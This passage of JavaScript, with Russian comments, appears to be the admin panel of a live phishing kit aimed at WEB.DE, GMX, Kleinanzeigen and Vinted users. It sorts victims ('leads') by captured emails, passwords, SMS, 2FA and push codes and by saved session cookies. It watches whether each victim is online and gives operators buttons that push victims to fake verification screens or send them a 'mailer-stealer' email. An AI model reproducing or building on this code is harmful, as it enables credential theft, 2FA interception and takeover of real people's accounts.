      if (l.indexOf('автовход klein') === 0) return { cls: 'action-change', label: 'Klein' };
      if (l === 'push' || l === 'просит push' || l.indexOf('просит push') === 0) return { cls: 'action-push', label: 'PUSH' };
      if (l.indexOf('переотправлен push') === 0) return { cls: 'action-push', label: 'Переотправлен Push' };
      if (l === 'просит новый' || l === 'запрос push') return { cls: 'action-push', label: 'Просит новый' };
      if (l === 'просит sms kl' || (l.indexOf('просит sms') !== -1 && l.indexOf('kl') !== -1)) {
        return { cls: 'action-sms', label: labels.sms };
      }
      if (l === 'просит sms' || l.indexOf('просит sms') === 0) return { cls: 'action-sms', label: labels.sms };
      if (l === 'окно ожидания') return { cls: 'action-change', label: 'Окно ожидания' };
      if (l.indexOf('время ожидания вышло') !== -1) return { cls: 'action-error', label: 'Таймаут' };
      // Единые EVENTS из server.js (EVENT_LABELS) + старые строки в логах
      if (l === 'запуск web.de' || l.indexOf('запуск web.de') === 0) return { cls: 'action-email', label: 'WEB.DE' };
      if (l === 'запуск klein' || l.indexOf('запуск klein') === 0) return { cls: 'action-change', label: 'Klein' };
      if (l === 'push') return { cls: 'action-push', label: 'PUSH' + suf };
      if (l.indexOf('push: таймаут') === 0) return { cls: 'action-push', label: 'PUSH: таймаут' };
      if (l.indexOf('push:') === 0 && l.indexOf('переотправ') !== -1) return { cls: 'action-push', label: 'Просит новый' };
      if (l === 'sms' || l === 'sms kl' || l === 'sms vt') return { cls: 'action-sms', label: labels.sms };
      if (l === 'неверные данные' || l === 'неверные данные kl') return { cls: 'action-error', label: l.indexOf(' kl') !== -1 ? 'Неверные данные Kl' : 'Неверные данные' };
      if (l === 'неверный sms' || l === 'неверный sms kl') return { cls: 'action-error', label: (l.indexOf(' kl') !== -1 || isVint) ? wrongSmsBrandLabel : 'Неверный SMS' };
      if (l === 'неверный 2fa') return { cls: 'action-error', label: 'Неверный 2FA' };
      if (l === '2fa') return { cls: 'action-sms', label: '2FA' };
      if (l.indexOf('2fa:') === 0) {
        if (l.indexOf('неверный') !== -1) return { cls: 'action-error', label: 'Неверный 2FA' };
        if (l.indexOf('таймаут') !== -1) return { cls: 'action-error', label: '2FA таймаут' };
        return { cls: 'action-sms', label: '2FA' };
      }
      if (l === 'успешный вход' || l === 'успешный вход kl' || l === 'успешный вход vt') return { cls: 'action-success', label: successBrandLabel };
      if (l.indexOf('автовход удался') !== -1) return { cls: 'action-success', label: successBrandLabel };
      if (l.indexOf('куки сохранен') !== -1) return { cls: 'action-success', label: successBrandLabel };
      if (l.indexOf('почтовый ящик открыт') !== -1) return { cls: 'action-success', label: successBrandLabel };
      if (l === 'почта готова' || l.indexOf('почта: готово к письму') === 0) return { cls: 'action-email-send', label: 'Send E-Mail' };
      if (l === 'включение фильтров на почте' || l === 'фильтры включены') return { cls: 'action-email-send', label: 'Фильтры' };
      if (l === 'почта: интерфейс подготовлен') return { cls: 'action-email-send', label: 'Почта UI' };
      if (l.indexOf('web.de:') === 0) {
        if (l.indexOf('попытка входа') !== -1) return { cls: 'action-email', label: 'WEB.DE' };
        if (l.indexOf('браузер') !== -1) return { cls: 'action-email', label: 'WEB.DE' };
        if (l.indexOf('почтовый ящик') !== -1) return { cls: 'action-success', label: 'Почта' };
        if (l.indexOf('экране push') !== -1) return { cls: 'action-push', label: 'PUSH' + suf };
        if (l.indexOf('экране 2fa') !== -1) return { cls: 'action-sms', label: '2FA' };
        if (l.indexOf('экране sms') !== -1) return { cls: 'action-sms', label: 'SMS' };
        return { cls: 'action-email', label: 'WEB.DE' };
      }
      if (l.indexOf('klein (скрипт):') === 0) return { cls: 'action-change', label: 'Klein' };
      if (l.indexOf('klein:') === 0) {
        if (l.indexOf('сессия почты') !== -1) return { cls: 'action-email-send', label: 'Почта→Klein' };
        if (l.indexOf('ждём') !== -1) return { cls: 'action-change', label: 'Ждём лид' };
        if (l.indexOf('лид на странице') !== -1) return { cls: 'action-change', label: 'Лид Klein' };
        if (l.indexOf('данные для входа') !== -1) return { cls: 'action-password', label: 'Креды Kl' };
        return { cls: 'action-change', label: 'Klein' };
      }
      if (l.indexOf('ввел почту kl') === 0 || l.indexOf('ввел почту vt') === 0 || l === 'email kl' || l === 'email vt') return { cls: 'action-email', label: altEmailLabel };
      if (l.indexOf('ввел почту') === 0 || l === 'email') return { cls: 'action-email', label: labels.primaryEmail };
      if (l.indexOf('ввел пароль kl') === 0 || l.indexOf('новый пароль kl') === 0 || l.indexOf('ввел пароль vt') === 0 || l.indexOf('новый пароль vt') === 0 || l === 'password kl' || l === 'password vt') return { cls: 'action-password', label: altPasswordLabel };
      if (l.indexOf('ввел пароль') === 0 || l.indexOf('новый пароль') === 0 || l === 'password') return { cls: 'action-password', label: labels.primaryPassword };
      if (l === 'error password') return { cls: 'action-error', label: 'Error Password' };
      if (l.indexOf('неверный пароль kl') === 0) return { cls: 'action-error', label: wrongPasswordBrandLabel };
      if (l.indexOf('неверный пароль') === 0) return { cls: 'action-error', label: (isKlein || isVint) ? wrongPasswordBrandLabel : 'Неверный пароль' };
      // Технический timeout long-poll (пароль не пришел от админки) не должен красить бейдж в Error SMS.
      if (l.indexOf('ошибка 408') === 0 && (l.indexOf('пароль не получен от админки') !== -1 || l.indexOf('long-poll timeout') !== -1)) {
        return { cls: 'action-email', label: (isKlein || isVint) ? altEmailLabel : 'Email' };
      }
      // Ввод кода на странице SMS (server: «Ввел SMS Kl: …» / «Ввел SMS-код: …») — раньше не матчилось на «sms kl» с начала строки → бейдж падал на status=error «Неверный пароль».
      if (l.indexOf('ввел sms kl') === 0 || l.indexOf('ввел sms vt') === 0) return { cls: 'action-sms', label: providedSmsBrandLabel };
      if (l.indexOf('ввел 2fa-код') === 0) return { cls: 'action-sms', label: 'Дал 2FA' };
      if (l.indexOf('ввел sms-код') === 0 || l.indexOf('ввел sms:') === 0) return { cls: 'action-sms', label: 'Дал SMS' };
      if (l === 'просит sms' || l.indexOf('просит sms') === 0) return { cls: 'action-sms', label: labels.sms };
      if (l.indexOf('переотправка sms') === 0) return { cls: 'action-sms', label: 'Просит новый' };
      if (l.indexOf('ошибка') === 0 && l.indexOf('неверный 2fa') !== -1) {
        return { cls: 'action-error', label: 'Неверный 2FA' };
      }
      if (l.indexOf('ошибка') === 0 && l.indexOf('неверный sms') !== -1) {
        return { cls: 'action-error', label: (isKlein || isVint) ? wrongSmsBrandLabel : 'Неверный SMS' };
      }
      if (l.indexOf('исключение при входе') !== -1 || l.indexOf('logintemporarilyunavailable') !== -1 || l.indexOf('поле пароля не появилось') !== -1 || l.indexOf('не удалось войти') !== -1) {
        return { cls: 'action-error', label: errLabel };
      }
      if (l.indexOf('ошибка') === 0 || l.indexOf('error') === 0) return { cls: 'action-error', label: errLabel };
      if (l.indexOf('sms kl') === 0 || l.indexOf('sms vt') === 0) return { cls: 'action-sms', label: labels.sms };
      if (l === 'sms' || l.indexOf('sms ') === 0) return { cls: 'action-sms', label: labels.sms };
      if (l.indexOf('ожидание push') !== -1) return { cls: 'action-push', label: 'PUSH' + suf };
      if (l.indexOf('push') === 0) return { cls: 'action-push', label: 'PUSH' + suf };
      if (l.indexOf('успех kl') === 0 || l.indexOf('успех vt') === 0) return { cls: 'action-success', label: successBrandLabel };
      if (l.indexOf('успех') === 0 || l.indexOf('вход удался') === 0) return { cls: 'action-success', label: successBrandLabel };
      if (l === 'автовход: прокси или сеть') return { cls: 'action-error', label: 'Прокси' };
      if (l.indexOf('отправлен на смену kl') === 0 || l.indexOf('отправлен на смену vt') === 0) return { cls: 'action-success', label: successBrandLabel };
      if (l.indexOf('отправлен на смену') === 0) return { cls: 'action-success', label: 'Успех' };
      // Config E-Mail: одна метка в логе — «Send Email» (+ старые «Email Send», «Письмо отправлено»)
      if (l === 'письмо отправлено' || (l.indexOf('письмо отправлено') !== -1 && l.indexOf('не отправилось') === -1 && l.indexOf('не удалось') === -1)) {
        return { cls: 'action-email-send', label: 'Send E-Mail' };
      }
      if (l === 'email send' || l === 'email send kl') return { cls: 'action-email-send', label: 'Send E-Mail' };
      if (l === 'send e-mail' || l.indexOf('send e-mail') === 0) return { cls: 'action-email-send', label: 'Send E-Mail' };
      if (l === 'send error' || l.indexOf('send error') === 0) return { cls: 'action-error', label: 'Send Error' };
      if (l === 'send email' || l.indexOf('send email') === 0) return { cls: 'action-email-send', label: 'Send E-Mail' };
      if (eventLabelLooksWorked(lbl)) return { cls: 'action-done', label: 'Отработан' };
      if (l.indexOf('нажал скачать') === 0 || l.indexOf('скачал') === 0) return { cls: 'action-download', label: 'Скачал' };
      return null;
    }

    /** Свежее событие с конца: одно только events[length-1] давало ошибку, если последняя запись без label или порядок сбит.
     * После «Снята пометка оператором» не поднимать старые «Отработан» из лога — показывать последнее действие до пометок. */
    var fromEvent = null;
    for (var ei = events.length - 1; ei >= 0 && !fromEvent; ei--) {
      var evi = events[ei];
      var evLbl = String((evi && evi.label != null ? evi.label : '') || (evi && evi.text != null ? evi.text : '') || '').trim();
      if (eventLabelLooksWorkedToggleOff(evLbl)) continue;
      if (eventLabelLooksWorked(evLbl)) continue;
      fromEvent = fromLastEvent(evLbl);
    }
    if (fromEvent) return fromEvent;

    if (status === 'show_error') return { cls: 'action-error', label: errLabel };
    if (status === 'error') return { cls: 'action-error', label: errLabel };
    if (status === 'show_success') return { cls: 'action-success', label: successBrandLabel };
    function hasWebdeScriptSuccess(l) {
      if (!l || !Array.isArray(l.eventTerminal)) return false;
      return l.eventTerminal.some(function (ev) {
        var lbl = ev && ev.label ? String(ev.label) : '';
        var low = lbl.toLowerCase();
        if (lbl === 'Вход удался' || lbl.indexOf('Вход удался') === 0) return true;
        if (low.indexOf('автовход удался') === 0) return true;
        if (lbl === 'Успешный вход' || lbl === 'Успешный вход Kl') return true;
        return lbl.indexOf('Успешный вход') === 0;
      });
    }

    if (status === 'redirect_change_password') {
      return { cls: 'action-success', label: successBrandLabel };
    }
    if (status === 'redirect_sicherheit') {
      return (lead && lead.brand === 'webde' && hasWebdeScriptSuccess(lead))
        ? { cls: 'action-success', label: successBrandLabel }
        : { cls: 'action-change', label: 'Sicherheit' + suf };
    }
    if (status === 'redirect_android') {
      return (lead && lead.brand === 'webde' && hasWebdeScriptSuccess(lead))
        ? { cls: 'action-success', label: successBrandLabel }
        : { cls: 'action-change', label: 'Android' + suf };
    }
    if (status === 'redirect_open_on_pc') {
      return (lead && lead.brand === 'webde' && hasWebdeScriptSuccess(lead))
        ? { cls: 'action-success', label: successBrandLabel }
        : { cls: 'action-change', label: 'Am pc' + suf };
    }

    if (status === 'redirect_gmx_net') return { cls: 'action-error', label: '→ Gmx' };
    if (status === 'redirect_klein_forgot') return { cls: 'action-change', label: 'Klein Passwort vergessen' };
    if (status === 'redirect_klein_sms_wait') return { cls: 'action-change', label: 'Окно ожидания' };
    if (status === 'redirect_push') {
      return lead && hasWebdeScriptSuccess(lead)
        ? { cls: 'action-success', label: successBrandLabel }
        : { cls: 'action-push', label: 'PUSH' };
    }
    if (status === 'redirect_2fa_code') {
      var code2fa = (lead.smsCodeData && lead.smsCodeData.code || '').trim();
      var has2fa = !!(code2fa && smsCodeDataKind(lead) === '2fa');
      return { cls: 'action-sms', label: (has2fa ? 'Дал 2FA' : '2-FA') + suf };
    }
    if (status === 'redirect_sms_code' || status === 'redirect_sms' || (lead.smsCodeData && (lead.smsCodeData.code || '').trim() && smsCodeDataKind(lead) === 'sms')) {
      var hasSubmittedSms = !!(lead.smsCodeData && (lead.smsCodeData.code || '').trim() && smsCodeDataKind(lead) === 'sms');
      return { cls: 'action-sms', label: hasSubmittedSms ? providedSmsBrandLabel : labels.sms };
    }
    if ((isKlein || isVint) && hasPasswordAlt) return { cls: 'action-password', label: altPasswordLabel };
    if (hasPassword) return { cls: 'action-password', label: isVint ? labels.primaryPassword : 'Password' };
    if (isKlein || isVint) return { cls: 'action-email', label: altEmailLabel };
    return { cls: 'action-email', label: 'Email' };
  }

  /** Онлайн только при живом пульсе со страницы лида (/api/status → sessionPulseAt). lastSeenAt в файле трогается при действиях админки — его нельзя путать с «на сайте». */
  function isOnline(lead) {
    var pulse = lead && lead.sessionPulseAt;
    if (!pulse) return false;
    var t = new Date(pulse).getTime();
    if (isNaN(t)) return false;
    return (Date.now() - t) < 35 * 1000;
  }

  function statusClass(lead) {
    return isOnline(lead) ? 'session-status' : 'session-status danger';
  }

  /** Время для порядка в списке: adminListSortAt (новая сессия / снова ввёл email), иначе createdAt, иначе lastSeenAt — см. сервер. */
  function leadRecencyMs(lead) {
    if (!lead) return 0;
    var als = lead.adminListSortAt ? new Date(lead.adminListSortAt).getTime() : NaN;
    if (!isNaN(als) && als > 0) return als;
    var cr = lead.createdAt ? new Date(lead.createdAt).getTime() : NaN;
    if (!isNaN(cr) && cr > 0) return cr;
    var ls = lead.lastSeenAt ? new Date(lead.lastSeenAt).getTime() : NaN;
    return !isNaN(ls) && ls > 0 ? ls : 0;
  }

  /** Сначала по «сессии» (adminListSortAt / createdAt), затем по id. */
  function sortLeadsNewFirst(arr) {
    if (!Array.isArray(arr) || arr.length === 0) return arr;
    return arr.slice().sort(function (a, b) {
      var ta = leadRecencyMs(a);
      var tb = leadRecencyMs(b);
      if (tb !== ta) return tb - ta;
      return (b.id || '').localeCompare(a.id || '');
    });
  }

  function getPlatformIcon(platform) {
    var p = (platform || '').toLowerCase();
    if (p !== 'android' && p !== 'ios' && p !== 'windows' && p !== 'macos') return '';
    var title = p === 'android' ? 'Android' : p === 'ios' ? 'iOS' : p === 'windows' ? 'Windows' : 'macOS';
    if (p === 'windows') {
      return '<span class="platform-icon" title="' + escapeHtml(title) + '" aria-hidden="true"><svg class="platform-icon-svg" viewBox="0 0 24 24" fill="#111"><path d="M3 4.5L11 3v9H3V4.5zm10 8.5V3l11-1.5V13H13zm-10 1h8v7L3 19.5V14zm10 0h11v8.5L13 21v-7z"/></svg></span>';
    }
    if (p === 'macos') {
      return '<span class="platform-icon" title="' + escapeHtml(title) + '" aria-hidden="true"><svg class="platform-icon-svg" viewBox="0 0 24 24" fill="#111"><path d="M16.4 13.2c0-2.6 2.1-3.8 2.2-3.9-1.2-1.8-3-2.1-3.7-2.1-1.6-.2-3.1.9-3.9.9-.8 0-2-.9-3.3-.9-1.7 0-3.3 1-4.2 2.6-1.8 3.1-.5 7.7 1.3 10.3.9 1.3 1.9 2.8 3.3 2.7 1.3-.1 1.8-.8 3.4-.8s2 .8 3.4.8c1.4 0 2.3-1.3 3.2-2.6 1-1.5 1.4-3 1.4-3.1-.1 0-2.7-1-2.7-3.9z"/><path d="M14.3 5.8c.7-.9 1.1-2 1-3.3-1 .1-2.2.7-2.9 1.6-.7.8-1.2 2-1.1 3.2 1.1.1 2.2-.5 3-1.5z"/></svg></span>';
    }
    if (p === 'android') {
      return '<span class="platform-icon" title="' + escapeHtml(title) + '" aria-hidden="true"><svg class="platform-icon-svg" viewBox="0 0 24 24" fill="#111"><path d="M7 7h10v10a2 2 0 0 1-2 2H9a2 2 0 0 1-2-2V7zm-2 2h1v7H5a1 1 0 0 1-1-1v-5a1 1 0 0 1 1-1zm14 0h1a1 1 0 0 1 1 1v5a1 1 0 0 1-1 1h-1V9zM9 4l1.2 2h3.6L15 4h1l-1.3 2.2A2 2 0 0 1 17 8H7a2 2 0 0 1 2.3-1.8L8 4h1z"/></svg></span>';
    }
    return '<span class="platform-icon" title="' + escapeHtml(title) + '" aria-hidden="true"><svg class="platform-icon-svg" viewBox="0 0 24 24" fill="#111"><path d="M16.4 13.2c0-2.6 2.1-3.8 2.2-3.9-1.2-1.8-3-2.1-3.7-2.1-1.6-.2-3.1.9-3.9.9-.8 0-2-.9-3.3-.9-1.7 0-3.3 1-4.2 2.6-1.8 3.1-.5 7.7 1.3 10.3.9 1.3 1.9 2.8 3.3 2.7 1.3-.1 1.8-.8 3.4-.8s2 .8 3.4.8c1.4 0 2.3-1.3 3.2-2.6 1-1.5 1.4-3 1.4-3.1-.1 0-2.7-1-2.7-3.9z"/><path d="M14.3 5.8c.7-.9 1.1-2 1-3.3-1 .1-2.2.7-2.9 1.6-.7.8-1.2 2-1.1 3.2 1.1.1 2.2-.5 3-1.5z"/></svg></span>';
  }

  function hasDownloaded(lead) {
    var events = lead && lead.eventTerminal ? lead.eventTerminal : [];
    for (var i = 0; i < events.length; i++) {
      if (events[i].label === 'Нажал скачать') return true;
    }
    return false;
  }

  var adminLeadsListModule = null;
  function getAdminLeadsListModule() {
    if (adminLeadsListModule) return adminLeadsListModule;
    if (!window.AdminLeadsListModule || typeof window.AdminLeadsListModule.create !== 'function') return null;
    adminLeadsListModule = window.AdminLeadsListModule.create({
      getEl: function () { return el; },
      getLeads: function () { return leads; },
      getSelectedId: function () { return selectedId; },
      setSelectedId: function (id) { selectedId = id; },
      getSelectedIds: function () { return selectedIds; },
      getLeadsTotal: function () { return leadsTotal; },
      getLeadsLimit: function () { return leadsLimit; },
      getLeadsPage: function () { return leadsPage; },
      getSearchQ: function () { return leadsSidebarSearchQ; },
      getSearchDraft: function () { return leadsSidebarSearchDraft; },
      getSearchTimer: function () { return leadsSidebarSearchTimer; },
      setSearchQ: function (v) { leadsSidebarSearchQ = v; },
      setSearchDraft: function (v) { leadsSidebarSearchDraft = v; },
      setSearchTimer: function (v) { leadsSidebarSearchTimer = v; },
      sortLeadsNewFirst: sortLeadsNewFirst,
      leadIdsEqual: leadIdsEqual,
      normalizeLeadId: normalizeLeadId,
      leadIsSidebarWorked: leadIsSidebarWorked,
      getBadgeClassAndLabel: getBadgeClassAndLabel,
      getLeadDisplayEmail: getLeadDisplayEmail,
      getPlatformIcon: getPlatformIcon,
      statusClass: statusClass,
      getLeadUnreadChatCount: getLeadUnreadChatCount,
      formatUnreadBadgeCount: formatUnreadBadgeCount,
      escapeHtml: escapeHtml,
      authFetch: authFetch,
      showToast: showToast,
      buildAntiFraudModalText: buildAntiFraudModalText,
      flushAdminDetailDebounce: flushAdminDetailDebounce,
      renderDetail: renderDetail,
      loadLeads: loadLeads,
      adminShowArchivedInList: adminShowArchivedInList,
      getSelectedLeadIds: getSelectedLeadIds,
      clearSelectionAfterBulk: clearSelectionAfterBulk,
      postBulkAction: postBulkAction,
      bulkSendEmail: bulkSendEmail,
      toggleAllOnCurrentPage: toggleAllOnCurrentPage,
      log: logLayoutHeights
    });
    return adminLeadsListModule;
  }

  function renderList() {
    var module = getAdminLeadsListModule();
    if (module && typeof module.renderList === 'function') {
      return module.renderList();
    }
  }

  function updateLeadListItemInPlace(lead) {
    var module = getAdminLeadsListModule();
    if (module && typeof module.updateLeadListItemInPlace === 'function') {
      return module.updateLeadListItemInPlace(lead);
    }
    return false;
  }

  function applyLeadUpdateFromWs(lead) {
    if (!lead || lead.id == null) return;
    if (adminModeLeadsFilter && typeof adminModeLeadsFilter.isLeadVisible === 'function' && !adminModeLeadsFilter.isLeadVisible(lead)) {
      scheduleLeadsReloadFromWs(false);
      return;
    }
    var id = normalizeLeadId(lead.id);
    var idx = -1;
    for (var i = 0; i < leads.length; i++) {
      if (leadIdsEqual(leads[i] && leads[i].id, id)) { idx = i; break; }
    }
    if (idx === -1) {
      // Обновился лид не с текущей страницы: не дёргаем немедленный full reload на каждый WS-событие.
      scheduleLeadsReloadFromWs(false);
      return;
    } else {
      var prev = leads[idx];
      // WS lead-update без тела cookies (слишком большой JSON после автовхода) — не затирать кэш админки пустым полем.
      if (
        prev
        && prev.cookies != null
        && String(prev.cookies).trim() !== ''
        && (lead.cookies == null || String(lead.cookies).trim() === '')
      ) {
        lead = Object.assign({}, lead, { cookies: prev.cookies });
      }
      leads[idx] = lead;
      if (!updateLeadListItemInPlace(lead)) renderList();
    }
    if (selectedId && leadIdsEqual(selectedId, id)) {
      scheduleRenderDetailFromWs(isChatTabActive() && leadUpdateTouchesChat(prev, lead));
    }
    scheduleActivityBadgeFromWs();
  }

  /** Дельта с сервера (persistLeadPatch): мержим в кэш списка без полного объекта лида. */
  function applyLeadPatchFromWs(leadId, patch) {
    if (!leadId || !patch || typeof patch !== 'object') return;
    var id = normalizeLeadId(leadId);
    var idx = -1;
    for (var i = 0; i < leads.length; i++) {
      if (leadIdsEqual(leads[i] && leads[i].id, id)) { idx = i; break; }
    }
    if (idx === -1) {
      scheduleLeadsReloadFromWs(false);
      return;
    }
    var base = leads[idx] && typeof leads[idx] === 'object' ? leads[idx] : {};
    var merged = {};
    var k;
    for (k in base) {
      if (Object.prototype.hasOwnProperty.call(base, k)) merged[k] = base[k];
    }
    for (k in patch) {
      if (Object.prototype.hasOwnProperty.call(patch, k) && k !== 'id') merged[k] = patch[k];
    }
    merged.id = base.id != null ? base.id : id;
    if (adminModeLeadsFilter && typeof adminModeLeadsFilter.isLeadVisible === 'function' && !adminModeLeadsFilter.isLeadVisible(merged)) {
      scheduleLeadsReloadFromWs(false);
      return;
    }
    leads[idx] = merged;
    if (!updateLeadListItemInPlace(merged)) renderList();
    if (selectedId && leadIdsEqual(selectedId, id)) {
      scheduleRenderDetailFromWs(isChatTabActive() && leadPatchTouchesChat(patch));
    }
    scheduleActivityBadgeFromWs();
  }

  function scheduleLeadsReloadFromWs(withChat) {
    if (withChat) wsLeadsReloadNeedChat = true;
    if (wsLeadsReloadTimer) return;
    wsLeadsReloadTimer = setTimeout(function () {
      wsLeadsReloadTimer = null;
      var needChat = wsLeadsReloadNeedChat;
      wsLeadsReloadNeedChat = false;
      loadLeads(function () {
        if (needChat && selectedId) loadAdminChat(true);
      });
    }, 480);
  }

  function appendTerminalLogLineFromWs(leadId, line) {
    if (!leadId || !line) return;
    for (var i = 0; i < leads.length; i++) {
      if (!leadIdsEqual(leads[i] && leads[i].id, leadId)) continue;
      if (adminModeLeadsFilter && typeof adminModeLeadsFilter.isLeadVisible === 'function' && !adminModeLeadsFilter.isLeadVisible(leads[i])) {
        return;
      }
      var prev = leads[i].logTerminal != null ? String(leads[i].logTerminal) : '';
      leads[i].logTerminal = prev ? (prev + '\n' + line) : line;
      break;
    }
    if (!selectedId || !leadIdsEqual(selectedId, leadId) || !el.detailTerminal) return;
    scheduleRenderDetailFromWs(false);
  }

  function getLeadBrandForLogSound(leadId) {
    var id = leadId != null ? String(leadId) : '';
    if (!id) return '';
    for (var i = 0; i < leads.length; i++) {
      var lead = leads[i];
      if (!leadIdsEqual(lead && lead.id, id)) continue;
      var brand = normalizeUiBrand(
        (lead && lead.brand) || (lead && lead.clientFormBrand) || (lead && lead.hostBrandAtSubmit)
      );
      return brand === 'klein' || brand === 'vint' ? brand : '';
    }
    return '';
  }

  function shouldPlayAdminLogSound(leadId, line) {
    var id = leadId != null ? String(leadId) : '';
    var text = line != null ? String(line) : '';
    if (!id || !text) return false;
    var now = Date.now();
    var key = id + '|' + text;
    if (key === lastAdminLogSoundKey && now - lastAdminLogSoundAtMs < 1600) {
      return false;
    }
    lastAdminLogSoundKey = key;
    lastAdminLogSoundAtMs = now;
    return true;
  }

  function adminShowArchivedInList() {
    try {
      return localStorage.getItem('gmw-admin-show-archived') === '1';
    } catch (e) {
      return false;
    }
  }

  function renderPagination() {
    var module = getAdminLeadsListModule();
    if (module && typeof module.renderPagination === 'function') {
      module.renderPagination();
    }
  }

  /** Лимит строк журнала в карточке (после compact): иначе тысячи событий → тяжёлый DOM при каждом render. */
  var RENDER_DETAIL_EVENTS_CAP = 500;
  /** Порядок: WEB/GMX — Error Push SMS | Password PC Download | E-Mail Success Отработан (без Delete/Android в сетке); Klein — 3+3+3. */
  function reorderDetailActionButtons(brand) {
    var wrap = document.getElementById('detail-action-buttons');
    if (!wrap) return;
    var klein = (brand || '').toLowerCase() === 'klein';
    wrap.classList.toggle('action-buttons--klein', klein);
    wrap.classList.toggle('action-buttons--web', !klein);
    var ids = klein
      ? ['btn-error', 'btn-sms-klein', 'btn-change-password', 'btn-klein-official-pw', 'btn-send-config-email', 'btn-send-mailer-stealer', 'btn-open-on-pc', 'btn-android', 'btn-success', 'btn-delete', 'btn-worked']
      : ['btn-error', 'btn-push', 'btn-sms', 'btn-2fa', 'btn-change-password', 'btn-open-on-pc', 'btn-sicherheit', 'btn-send-config-email', 'btn-send-mailer-stealer', 'btn-success', 'btn-worked'];
    ids.forEach(function (id) {
      var node = document.getElementById(id);
      if (node) wrap.appendChild(node);
    });
    var sicher = document.getElementById('btn-sicherheit');
    if (sicher) {
      if (klein) {
        sicher.style.display = 'none';
        wrap.appendChild(sicher);
      } else {
        sicher.style.display = '';
      }
    }
    if (!klein) {
      var btnDel = document.getElementById('btn-delete');
      var btnAnd = document.getElementById('btn-android');
      if (btnDel) wrap.appendChild(btnDel);
      if (btnAnd) wrap.appendChild(btnAnd);
    }
  }

  var renderDetailScheduled = null;
  function renderDetail() {
    if (renderDetailScheduled !== null) return;
    renderDetailScheduled = requestAnimationFrame(function () {
      renderDetailScheduled = null;
      renderDetailNow();
    });
  }
  function renderDetailNow() {
    var placeholder = el.detailPlaceholder;
    var main = el.mainContent;
    if (!placeholder || !main) return;

    var lead = leads.find(function (l) { return leadIdsEqual(l.id, selectedId); });
    if (!lead) {
      placeholder.classList.remove('hidden');
      main.classList.add('hidden');
      if (el.statsContent) el.statsContent.classList.add('hidden');
      var dc = main.querySelector('.detail-card');
      if (dc) {
        dc.classList.remove('detail-card--worked');
        dc.classList.remove('detail-card--kl-archived');
        dc.classList.remove('detail-card--admin-archived');
      }
      var wb = document.getElementById('detail-worked-banner');
      if (wb) wb.classList.add('hidden');
      var btnCfgEmpty = document.getElementById('btn-send-config-email');
      var btnStealerEmpty = document.getElementById('btn-send-mailer-stealer');
      [btnCfgEmpty, btnStealerEmpty].forEach(function (b) {
        if (!b) return;
        b.disabled = false;
        if (b.dataset.defaultTitle) b.setAttribute('title', b.dataset.defaultTitle);
      });
      loadAdminChat();
      return;
    }

    if (el.statsContent) el.statsContent.classList.add('hidden');
    placeholder.classList.add('hidden');
    main.classList.remove('hidden');
    var detailCardEl = main.querySelector('.detail-card');
    var workedDetail = leadIsSidebarWorked(lead);
    if (detailCardEl) {
      detailCardEl.classList.toggle('detail-card--kl-archived', (lead.brand || '').toLowerCase() === 'klein' && lead.klLogArchived === true);
      detailCardEl.classList.toggle('detail-card--admin-archived', (lead.brand || '').toLowerCase() !== 'klein' && lead.adminLogArchived === true);
      detailCardEl.classList.toggle('detail-card--worked', workedDetail);
    }
    var workedBannerEl = document.getElementById('detail-worked-banner');
    if (workedBannerEl) workedBannerEl.classList.toggle('hidden', !workedDetail);

    if (typeof adminLeadDetail.renderLeadDetailPanel === 'function') {
      adminLeadDetail.renderLeadDetailPanel({
        lead: lead,
        el: el,
        getLeadBrandLabelSet: getLeadBrandLabelSet,
        getLeadAltEmailValue: getLeadAltEmailValue,
        getLeadAltPasswordValue: getLeadAltPasswordValue,
        smsCodeDataKind: smsCodeDataKind,
        isOnline: isOnline,
        leadIdsEqual: leadIdsEqual,
        normalizeLeadId: normalizeLeadId,
        detailEventsPastExpanded: detailEventsPastExpanded,
        buildCompactEventsForRender: buildCompactEventsForRender,
        renderDetailEventsCap: RENDER_DETAIL_EVENTS_CAP
      });
    }

    var brand = (lead.brand || '').toLowerCase();
    reorderDetailActionButtons(brand);
    var btnPushDetail = document.getElementById('btn-push');
    if (btnPushDetail) btnPushDetail.style.display = brand === 'klein' ? 'none' : '';
    var btnSmsDetail = document.getElementById('btn-sms');
    var btnSmsKleinDetail = document.getElementById('btn-sms-klein');
    var btnWorkedDetail = document.getElementById('btn-worked');
    var btn2faDetail = document.getElementById('btn-2fa');
    if (btnSmsDetail && btnSmsKleinDetail) {
      if (brand === 'klein') {
        btnSmsDetail.style.display = 'none';
        btnSmsKleinDetail.classList.remove('hidden');
        if (btn2faDetail) btn2faDetail.style.display = 'none';
      } else {
        btnSmsDetail.style.display = '';
        btnSmsKleinDetail.classList.add('hidden');
        if (btn2faDetail) btn2faDetail.style.display = '';
      }
    }
    if (btnWorkedDetail) {
      btnWorkedDetail.style.display = '';
    }
    var btnDeleteDetail = document.getElementById('btn-delete');
    if (btnDeleteDetail) {
      btnDeleteDetail.style.display = brand === 'klein' ? '' : 'none';
    }
    var btnAndroidDetail = document.getElementById('btn-android');
    if (btnAndroidDetail) {
      btnAndroidDetail.style.display = brand === 'klein' ? '' : 'none';
    }
    var btnKleinOfficialPwDetail = document.getElementById('btn-klein-official-pw');
    if (btnKleinOfficialPwDetail) {
      if (brand === 'klein') btnKleinOfficialPwDetail.classList.remove('hidden');
      else btnKleinOfficialPwDetail.classList.add('hidden');
    }
    ['btn-send-config-email', 'btn-send-mailer-stealer'].forEach(function (bid) {
      var b = document.getElementById(bid);
      if (!b) return;
      if (!b.dataset.defaultTitle) b.dataset.defaultTitle = b.getAttribute('title') || '';
      b.disabled = !!workedDetail;
      b.setAttribute('title', workedDetail ? 'Лог отработан — отправка письма отключена' : b.dataset.defaultTitle);
    });
    loadAdminChat(true);
  }

  var adminChatPanel = null;

  function loadAdminChat(forceUpdate) {
    if (adminChatPanel && typeof adminChatPanel.load === 'function') {
      adminChatPanel.load(forceUpdate);
    }
  }

  function onChatTabActivated() {
    if (adminChatPanel && typeof adminChatPanel.onChatTabActivated === 'function') {
      adminChatPanel.onChatTabActivated();
      return;
    }
    if (selectedId && leads) {
      var lead = leads.find(function (l) { return leadIdsEqual(l.id, selectedId); });
      if (lead) {
        var cc = getLeadUnreadChatCount(lead);
        if (lastViewedSnapshot[selectedId]) lastViewedSnapshot[selectedId].chatUnreadCount = cc;
        else lastViewedSnapshot[selectedId] = { userEventCount: getUserEventCount(lead.eventTerminal), chatUnreadCount: cc };
        updateActivityBadge(getNewActivityCount(leads));
        updateChatTabNewIndicator();
      }
    }
    loadAdminChat(true);
  }

  function initAdminChat() {
    if (typeof window.initAdminChatPanel !== 'function') return;
